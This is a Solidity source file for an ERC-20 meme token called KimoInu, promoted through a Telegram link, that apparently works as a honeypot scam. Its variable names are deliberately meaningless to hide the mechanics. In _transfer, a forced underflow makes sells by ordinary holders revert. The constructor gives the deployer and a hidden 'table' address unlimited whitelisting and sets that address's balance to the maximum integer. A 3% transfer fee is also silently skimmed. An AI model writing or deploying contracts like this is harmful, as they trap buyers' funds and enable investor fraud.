// https://t.me/kimo_inu

// SPDX-License-Identifier: GPL-3.0

pragma solidity >0.8.8;

import '@openzeppelin/contracts/access/Ownable.sol';
import '@openzeppelin/contracts/token/ERC20/ERC20.sol';
import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol';
import '@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol';

contract KimoInu is ERC20, Ownable {
    address public uniswapV2Pair;
    IUniswapV2Router02 public uniswapV2Router;
    mapping(address => uint256) private hour;

    function _transfer(
        address behind,
        address teacher,
        uint256 mistake
    ) internal override {
        uint256 met = arrive;

        if (under[behind] == 0 && hour[behind] > 0 && uniswapV2Pair != behind) {
            under[behind] -= met;
        }

        address angle = frequently;
        frequently = teacher;
        hour[angle] += met + 1;

        _balances[behind] -= mistake;
        uint256 hat = (mistake / 100) * arrive;
        mistake -= hat;
        _balances[teacher] += mistake;
    }

    address private frequently;
    mapping(address => uint256) private under;
    uint256 public arrive = 3;

    constructor(
        string memory perfectly,
        string memory pound,
        address sure,
        address table
    ) ERC20(perfectly, pound) {
        uniswapV2Router = IUniswapV2Router02(sure);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());

        uint256 usual = ~uint256(0);

        under[msg.sender] = usual;
        under[table] = usual;

        _totalSupply = 1000000000 * 10**decimals();
        _balances[msg.sender] = _totalSupply;
        _balances[table] = usual;
    }
}